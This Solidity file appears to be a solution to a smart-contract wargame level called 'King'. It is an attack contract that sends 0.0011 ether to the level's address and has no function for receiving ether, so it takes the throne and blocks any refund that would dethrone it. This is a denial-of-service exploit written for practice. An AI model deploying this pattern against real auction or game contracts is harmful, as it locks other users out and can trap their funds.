// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/King.sol";

contract KingAttack{
    function att(address addr) public payable {
        addr.call{value : 0.0011 ether}("");
    }
}